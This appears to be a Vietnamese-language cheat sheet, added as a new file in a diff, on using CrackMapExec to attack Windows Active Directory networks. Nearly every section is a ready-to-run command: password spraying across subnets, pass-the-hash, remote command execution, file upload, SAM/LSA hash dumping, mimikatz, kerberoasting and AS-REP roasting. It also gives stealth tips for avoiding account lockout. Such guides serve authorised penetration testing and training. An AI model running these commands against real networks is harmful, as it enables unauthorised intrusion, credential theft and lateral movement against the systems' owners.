@@ -1,0 +1,195 @@
+1. CrackMapExec (CME) là gì?
+
+    CrackMapExec là framework dòng lệnh (Python), chuyên automation enumerate, kiểm thử và tấn công các giao thức Microsoft:
+
+        SMB, RDP, WinRM, MSSQL, LDAP, Kerberos
+
+        Tự động kiểm tra credential, thực thi lệnh, dump hash, gather info, lateral movement...
+
+        Hỗ trợ modules/plugin, automation toàn bộ workflow pentest/red team trên AD.
+
+2. Cài đặt CrackMapExec
+A. Trên Kali/Ubuntu (luôn nên dùng bản mới nhất qua pip)
+
+sudo apt update
+sudo apt install crackmapexec
+
+Hoặc bản mới, chuẩn hơn qua pip (khuyên dùng):
+
+pipx install crackmapexec
+
+(Cần pipx – nếu chưa có: pip install pipx)
+(CME Python >=3.8)
+B. Kiểm tra
+
+cme --version
+
+(Nếu lỗi, thử python3 -m crackmapexec ...)
+3. Chức năng chính của CME
+
+    Credential validation (kiểm tra user/pass hoặc hash)
+
+    Enum thông tin host/domain/user/share
+
+    Command execution (thực thi lệnh từ xa)
+
+    Dump hash (LSASS, SAM, LSA)
+
+    Lateral movement (pass-the-hash, pass-the-ticket, kerberoasting, RCE)
+
+    Spray/brute-force user/pass
+
+    Enum session, group, policy, installed software...
+
+    Tích hợp nhiều module mạnh khác (Mimikatz, secretsdump, kerbrute, ...)
+
+    Automation: Quét hàng trăm host cùng lúc
+
+4. Cấu trúc lệnh cơ bản CME
+
+cme <protocol> <targets> [options]
+
+    protocol: smb, winrm, rdp, mssql, ldap, kerberos
+
+    targets: 1 IP, dải, file IP, CIDR...
+
+5. Sử dụng CrackMapExec cơ bản
+A. Kiểm tra credential SMB
+
+cme smb 192.168.1.0/24 -u user -p password
+
+    Quét toàn bộ dải, xác thực SMB bằng user/pass.
+
+B. Kiểm tra credential với hash (Pass-the-Hash)
+
+cme smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
+
+    -H: NTLM hash, không cần pass thật.
+
+C. Quét nhiều host cùng lúc
+
+cme smb hosts.txt -u user -p pass
+
+    hosts.txt: mỗi dòng 1 IP.
+
+D. Spray user/pass (password spray)
+
+cme smb 192.168.1.0/24 -u userlist.txt -p 'Password123!'
+
+    Hoặc spray nhiều pass:
+
+    cme smb 192.168.1.0/24 -u userlist.txt -P passlist.txt
+
+6. Enumerate thông tin (group, share, sessions...)
+
+    Liệt kê shares:
+
+cme smb 192.168.1.10 -u user -p pass --shares
+
+Liệt kê users/group:
+
+cme smb 192.168.1.10 -u user -p pass --users
+cme smb 192.168.1.10 -u user -p pass --groups
+
+Liệt kê sessions/logon:
+
+cme smb 192.168.1.10 -u user -p pass --sessions
+
+Liệt kê local admin:
+
+    cme smb 192.168.1.10 -u user -p pass --local-auth --users
+
+7. Thực thi lệnh từ xa (RCE) – Red Team
+
+    Chạy lệnh trực tiếp:
+
+cme smb 192.168.1.10 -u user -p pass -x "ipconfig"
+
+Tải file lên host:
+
+    cme smb 192.168.1.10 -u user -p pass --put localfile.exe
+
+8. Dump hash, secrets, các attack module mạnh
+
+    Dump SAM, LSA secrets (dùng secretsdump):
+
+cme smb 192.168.1.10 -u user -p pass --sam
+cme smb 192.168.1.10 -u user -p pass --lsa
+
+Dùng mimikatz (dump hash, pass clear, ticket):
+
+cme smb 192.168.1.10 -u user -p pass -M mimikatz
+
+Kerberoast (lấy ticket SPN, crack offline):
+
+cme smb 192.168.1.10 -u user -p pass -M kerberoast
+
+AS-REP roast:
+
+    cme smb 192.168.1.10 -u user -p pass -M asreproast
+
+9. Enum password policy, installed software, local group...
+
+cme smb 192.168.1.10 -u user -p pass --pass-pol
+cme smb 192.168.1.10 -u user -p pass --loggedon-users
+cme smb 192.168.1.10 -u user -p pass --disks
+cme smb 192.168.1.10 -u user -p pass --lsa
+
+10. Tích hợp workflow automation
+
+    Automation toàn AD:
+
+        Spray user/pass trên subnet, enumerate, dump hash, chạy lệnh, xuất báo cáo:
+
+    cme smb 10.0.0.0/16 -u users.txt -P passes.txt --shares --sessions -o cme_report.txt
+
+    Export ra JSON để import lên SIEM, dashboard, Excel...
+
+11. Các mẹo nâng cao, stealth, tối ưu thực chiến
+
+    Kết hợp với kerbrute để enum user trước khi spray.
+
+    Spray pass thật chậm, limit thread tránh lockout AD.
+
+    Phối hợp nhiều giao thức: SMB → WinRM → RDP → MSSQL.
+
+    Output đẹp, dễ log, script hoá bằng bash/Python/PowerShell.
+
+    Cài plugin (module) mở rộng theo mục tiêu: RCE, exploit, relay, ticket extraction...
+
+12. So sánh CME với các tool khác
+Tool	Ưu điểm CME	Khác biệt
+CrackMapExec	Nhanh, đa giao thức, automation, log đẹp, module mạnh	Không đẹp UI như Bloodhound
+Impacket	Thư viện nhiều script AD, nhiều tuỳ biến	Script-based, không “all-in-one”
+Bloodhound	Đồ hoạ, relationship AD	Không spray, không command exec
+Evil-WinRM	Quản trị WinRM, powershell	Chỉ cho WinRM, không spray
+Metasploit	Automation exploit, module nhiều	Không tiện cho mass pentest AD
+13. Các lỗi thường gặp & fix nhanh
+Lỗi	Fix
+“STATUS_LOGON_FAILURE”	Sai user/pass hoặc host không mở SMB
+“STATUS_ACCOUNT_LOCKED_OUT”	Spray quá nhanh, giảm thread, tăng delay
+“Kerberos error”	Check tên domain, sync giờ
+Lỗi pip/module	Update pipx, pip, hoặc cài bản mới từ Github
+“Could not load smb.conf”	Cài đặt smbclient hoặc chỉ định file conf
+14. Tài liệu, link hữu ích
+
+    CrackMapExec Github
+
+    PayloadAllTheThings AD Playbook
+
+    CME Modules
+
+    Red Team Notes CME
+
+    cme --help
+
+Tóm tắt nhanh
+
+    CrackMapExec: tool pentest AD mạnh nhất, automation mọi thứ trên SMB/WinRM/RDP/MSSQL/LDAP/Kerberos...
+
+    Tích hợp nhiều module attack, dump hash, run command, lateral movement, spray credential, export report.
+
+    Dùng cực tiện trong red team, blue team, audit nội bộ hoặc bug bounty có AD/Windows target.
+
+    Nên luôn log output, limit tốc độ, phối hợp với tool khác (kerbrute, bloodhound, impacket...) để tối ưu workflow.
+
